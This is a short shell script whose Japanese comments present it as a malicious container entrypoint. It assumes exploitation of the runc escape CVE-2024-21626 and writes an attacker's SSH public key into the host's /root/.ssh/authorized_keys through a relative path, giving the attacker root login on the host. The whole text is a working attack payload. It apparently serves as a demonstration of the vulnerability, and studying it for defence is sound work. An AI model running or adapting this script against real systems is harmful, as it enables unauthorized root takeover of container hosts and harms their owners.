#!/bin/sh
# これも攻撃者がどこかで配信している、悪意あるentry pointスクリプト。
# CVE-2024-21626 が刺さった状態を前提とし、攻撃者自身の公開鍵を
# `../../../root/.ssh/authorized_keys` : ホストの `/root/.ssh/authorized_keys`
# に書き込むことで、攻撃者自身がホストにrootログインできるようにする。
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKPHHGSytV6bL1ryaEKE9XNWN23piXdzsI3Rzxe20IF6 ubuntu@attacker-server' > ../../../root/.ssh/authorized_keys
